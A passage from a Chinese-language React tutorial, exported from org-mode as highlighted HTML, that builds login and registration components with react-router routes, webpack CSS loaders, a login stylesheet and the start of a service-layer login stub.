    &lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"message"</span>&gt;Already registered? &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"#"</span>&gt;Sign In&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
    &lt;/<span style="color: #0000ff;">form</span>&gt;
    &lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
    &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"username"</span>/&gt;
    &lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"password"</span>/&gt;
    &lt;<span style="color: #0000ff;">button</span>&gt;login&lt;/<span style="color: #0000ff;">button</span>&gt;
    &lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">class</span>=<span style="color: #8b2252;">"message"</span>&gt;Not registered? &lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">href</span>=<span style="color: #8b2252;">"#"</span>&gt;Create an account&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
    &lt;/<span style="color: #0000ff;">form</span>&gt;
&lt;/<span style="color: #0000ff;">div</span>&gt;
&lt;/<span style="color: #0000ff;">div</span>&gt;
</pre>
</div>

<p>
使用这个HTML模板来构建组件
</p>

<p>
<b>特别注意</b>
</p>
<ol class="org-ol">
<li>搬到React组件中的时候，要 <b>将class属性改为className</b>.</li>
<li>所有标签，需要闭合。</li>
</ol>

<p>
<b>login.js</b>
</p>
<ol class="org-ol">
<li>在component目录下新建login.js的登录组件。</li>
<li>使用上面的模板的HTML中的登录部分，挪到render函数中。
<ul class="org-ul">
<li>修改class为className</li>
<li>将 <code>&lt;a&gt;</code> 标签替换成 <code>&lt;Link to="?"&gt;</code> 组件</li>
<li>注意标签闭合问题</li>
</ul></li>
</ol>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#26032;&#24314;&#25991;&#20214;src/component/login.js</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">"react"</span>;
<span style="color: #a020f0;">import</span> {Link} from <span style="color: #8b2252;">"react-router-dom"</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component {
    render() {
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"username"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"password"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">button</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#36824;&#26410;&#27880;&#20876;&#65311; </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
        )
    }
}
</pre>
</div>

<p>
<b>在src/index.js路由中增加登录组件</b>
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;src/index.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
...
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">exact &#31934;&#30830;&#21305;&#37197;</span>
  render() {
    <span style="color: #a020f0;">return</span> &lt;Router&gt;
      &lt;div&gt;
        &lt;Switch&gt;
          &lt;Route exact path={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} component={Home}&gt;&lt;/Route&gt;
          &lt;Route path=<span style="color: #8b2252;">"/login"</span> component={Login}&gt;&lt;/Route&gt;
</pre>
</div>

<ul class="org-ul">
<li>访问<a href="http://127.0.0.1:3000/login">http://127.0.0.1:3000/login</a> 就可以看到登录界面了，但是没有样式。</li>
</ul>

<p>
<b>样式表</b>
</p>

<p>
webpack.config.dev.js  webpack.config.prod.js
</p>
<ul class="org-ul">
<li>css-loader 加载css</li>
<li>style-loader通过 &lt;style&gt; 标签把css添加到DOM中</li>
</ul>
<div class="org-src-container">
<pre class="src src-js">module: {
    rules: [
        {
            test: <span style="color: #8b2252;">/\.js$/</span>,
            exclude: <span style="color: #8b2252;">/node_modules/</span>,
            use: [
                { loader: <span style="color: #8b2252;">'react-hot-loader/webpack'</span> },
                { loader: <span style="color: #8b2252;">'babel-loader'</span> }
            ]
        },
        {
            test: <span style="color: #8b2252;">/\.css$/</span>,
            use: [
                { loader: <span style="color: #8b2252;">"style-loader"</span> },
                { loader: <span style="color: #8b2252;">"css-loader"</span> },
            ]
         }, 
        {
            test: <span style="color: #8b2252;">/\.less$/</span>,
            use: [
                { loader: <span style="color: #8b2252;">"style-loader"</span> },
                { loader: <span style="color: #8b2252;">"css-loader"</span> },
                { loader: <span style="color: #8b2252;">"less-loader"</span> }
            ]
        }
    ]
},
</pre>
</div>

<ul class="org-ul">
<li>在src/css中，创建login.css,放入以下内容，然后src/component/login.js中导入样式</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">src/component/login.js&#20013;&#23548;&#20837;&#26679;&#24335;&#34920;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">"react"</span>;
<span style="color: #a020f0;">import</span> {Link} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-css"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#26032;&#24314;src/css/login.css&#25991;&#20214;</span><span style="color: #b22222;"> */</span>
<span style="color: #0000ff;">body</span> {
  <span style="color: #a020f0;">font-family</span>: <span style="color: #8b2252;">"Roboto"</span>, sans-serif;
}

<span style="color: #0000ff;">.login-page</span> {
  <span style="color: #a020f0;">width</span>: 360px;
  <span style="color: #a020f0;">padding</span>: 8% 0 0;
  <span style="color: #a020f0;">margin</span>: auto;
}
<span style="color: #0000ff;">.form</span> {
  <span style="color: #a020f0;">position</span>: relative;
  <span style="color: #a020f0;">z-index</span>: 1;
  <span style="color: #a020f0;">background</span>: <span style="color: #000000; background-color: #FFFFFF;">#FFFFFF</span>;
  <span style="color: #a020f0;">max-width</span>: 360px;
  <span style="color: #a020f0;">margin</span>: 0 auto 100px;
  <span style="color: #a020f0;">padding</span>: 45px;
  <span style="color: #a020f0;">text-align</span>: center;
  <span style="color: #a020f0;">box-shadow</span>: 0 0 20px 0 <span style="color: #ffffff; background-color: #000000;">rgba(0, 0, 0, 0.2)</span>, 0 5px 5px 0 <span style="color: #ffffff; background-color: #000000;">rgba(0, 0, 0, 0.24)</span>;
}
<span style="color: #0000ff;">.form input</span> {
  <span style="color: #a020f0;">font-family</span>: <span style="color: #8b2252;">"Roboto"</span>, sans-serif;
  <span style="color: #a020f0;">outline</span>: 0;
  <span style="color: #a020f0;">background</span>: <span style="color: #000000; background-color: #f2f2f2;">#f2f2f2</span>;
  <span style="color: #a020f0;">width</span>: 100%;
  <span style="color: #a020f0;">border</span>: 0;
  <span style="color: #a020f0;">margin</span>: 0 0 15px;
  <span style="color: #a020f0;">padding</span>: 15px;
  <span style="color: #a020f0;">box-sizing</span>: border-box;
  <span style="color: #a020f0;">font-size</span>: 14px;
}
<span style="color: #0000ff;">.form button</span> {
  <span style="color: #a020f0;">font-family</span>: <span style="color: #8b2252;">"Roboto"</span>, sans-serif;
  <span style="color: #a020f0;">text-transform</span>: uppercase;
  <span style="color: #a020f0;">outline</span>: 0;
  <span style="color: #a020f0;">background</span>: <span style="color: #000000; background-color: #4CAF50;">#4CAF50</span>;
  <span style="color: #a020f0;">width</span>: 100%;
  <span style="color: #a020f0;">border</span>: 0;
  <span style="color: #a020f0;">padding</span>: 15px;
  <span style="color: #a020f0;">color</span>: <span style="color: #000000; background-color: #FFFFFF;">#FFFFFF</span>;
  <span style="color: #a020f0;">font-size</span>: 14px;
  <span style="color: #a020f0; font-style: italic;">-webkit-transition</span>: all 0.3 ease;
  <span style="color: #a020f0;">transition</span>: all 0.3 ease;
  <span style="color: #a020f0;">cursor</span>: pointer;
}
<span style="color: #0000ff;">.form button:hover,.form button:active,.form button:focus</span> {
  <span style="color: #a020f0;">background</span>: <span style="color: #ffffff; background-color: #43A047;">#43A047</span>;
}
<span style="color: #0000ff;">.form .message</span> {
  <span style="color: #a020f0;">margin</span>: 15px 0 0;
  <span style="color: #a020f0;">color</span>: <span style="color: #000000; background-color: #b3b3b3;">#b3b3b3</span>;
  <span style="color: #a020f0;">font-size</span>: 12px;
}
<span style="color: #0000ff;">.form .message a</span> {
  <span style="color: #a020f0;">color</span>: <span style="color: #000000; background-color: #4CAF50;">#4CAF50</span>;
  <span style="color: #a020f0;">text-decoration</span>: none;
}
</pre>
</div>

<ul class="org-ul">
<li>访问<a href="http://localhost:3000/login">http://localhost:3000/login</a> 可以看到如下界面</li>
</ul>
</div>
</div>
<div id="outline-container-h:0a3a7aa3-8099-4dd9-8a85-8ad470d21dae" class="outline-4">
<h4 id="h:0a3a7aa3-8099-4dd9-8a85-8ad470d21dae">注册组件</h4>
<div class="outline-text-4" id="text-h:0a3a7aa3-8099-4dd9-8a85-8ad470d21dae">
<p>
与登录组件编写方式差不多，创建src/component/reg.js, 使用login.css
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">&#26032;&#24314;src/component/reg.js&#25991;&#20214;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'../css/login.css'</span>;

<span style="color: #b22222;">// </span><span style="color: #b22222;">&#32570;&#30465;&#23548;&#20986;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Reg <span style="color: #a020f0;">extends</span> React.Component {
  render() {
    <span style="color: #a020f0;">return</span> (
      &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"register-form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#29992;&#25143;&#21517;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"text"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30005;&#23376;&#37038;&#31665;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">input</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"password"</span> <span style="color: #a0522d;">placeholder</span>=<span style="color: #8b2252;">"&#30830;&#35748;&#23494;&#30721;"</span>/&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">button</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">button</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">p</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"message"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#24050;&#32463;&#27880;&#20876;, </span>&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#35831;&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">p</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">form</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
    );
  }
}
</pre>
</div>

<p>
在src/index.js中增加一条静态路由
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">src/index.js&#20013;&#20462;&#25913;</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Home</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">About</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Default</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Always</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;&lt;<span style="color: #0000ff;">hr</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#39029;&#33050;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">exact &#31934;&#30830;&#21305;&#37197;</span>
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}

render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>

<ul class="org-ul">
<li>访问<a href="http://localhost:3000/reg">http://localhost:3000/reg</a> 可以看到如下界面</li>
</ul>
</div>
</div>
<div id="outline-container-h:eedefb16-14c9-4816-bf60-1d98b8b80327" class="outline-4">
<h4 id="h:eedefb16-14c9-4816-bf60-1d98b8b80327">导航栏链接</h4>
<div class="outline-text-4" id="text-h:eedefb16-14c9-4816-bf60-1d98b8b80327">
<ul class="org-ul">
<li>在index.js中增加导航栏链接，方便页面切换</li>
</ul>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;src/index.js&#25991;&#20214;</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> {
  BrowserRouter as Router,
  Switch,
  Route,
  Link
} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Home</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">About</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Default</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">function</span> <span style="color: #0000ff;">Always</span>() {
  <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">h2</span>&gt;&lt;<span style="color: #0000ff;">hr</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#39029;&#33050;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
}

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  <span style="color: #b22222;">// </span><span style="color: #b22222;">exact &#31934;&#30830;&#21305;&#37197;</span>
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">ul</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">li</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">li</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">ul</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Always}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">    </span>&lt;/<span style="color: #0000ff;">Router</span>&gt;
  }
}

render(&lt;<span style="color: #0000ff;">App</span> /&gt;, document.getElementById(<span style="color: #8b2252;">'root'</span>)); 
</pre>
</div>
</div>
</div>
<div id="outline-container-h:5a32628c-dab9-4154-9733-b2bdc87e9c70" class="outline-4">
<h4 id="h:5a32628c-dab9-4154-9733-b2bdc87e9c70">分层</h4>
<div class="outline-text-4" id="text-h:5a32628c-dab9-4154-9733-b2bdc87e9c70">
<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">

<col  class="org-left">
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">层次</th>
<th scope="col" class="org-left">作用</th>
<th scope="col" class="org-left">路径</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">视图层</td>
<td class="org-left">负责数据呈现，负责用户交互界面</td>
<td class="org-left">src/component/xxx.js</td>
</tr>

<tr>
<td class="org-left">服务层</td>
<td class="org-left">负责业务逻辑处理</td>
<td class="org-left">src/service/xxx.js</td>
</tr>

<tr>
<td class="org-left">Model层</td>
<td class="org-left">数据持久化</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="outline-container-h:6dd995b4-6cf1-42b9-ab10-f735a8aae72a" class="outline-4">
<h4 id="h:6dd995b4-6cf1-42b9-ab10-f735a8aae72a">登录功能实现</h4>
<div class="outline-text-4" id="text-h:6dd995b4-6cf1-42b9-ab10-f735a8aae72a">
<ul class="org-ul">
<li>view层，登录组件和用户交互。相当于button点击触发onclick,调用事件响应函数handleClick,handleClick中调用服务service层login函数。</li>
<li>service层，负责业务逻辑处理。调用Model层数据操作函数</li>
</ul>

<p>
新建src/service/user.js处理调用逻辑
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#26032;&#24314;src/service/user.js&#36923;&#36753;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> UserService {
    login(username, password) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, username, password)
        <span style="color: #b22222;">// </span><span style="color: #b22222;">TODO &#24453;&#23436;&#25104;&#20195;&#30721;</span>
    }
}
</pre>
</div>

<p>
修改src/component/login.js文件
</p>

<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/* </span><span style="color: #b22222;">&#20462;&#25913;src/component/login.js&#25991;&#20214;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">"react"</span>;
<span style="color: #a020f0;">import</span> {Link} from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">"../css/login.css"</span>;

<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Login <span style="color: #a020f0;">extends</span> React.Component {
    handleClick(event){
        console.log(event.target)
    }

    render() {
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-page"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"form"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">                </span>&lt;<span style="color: #0000ff;">form</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"login-form"</span>&gt;
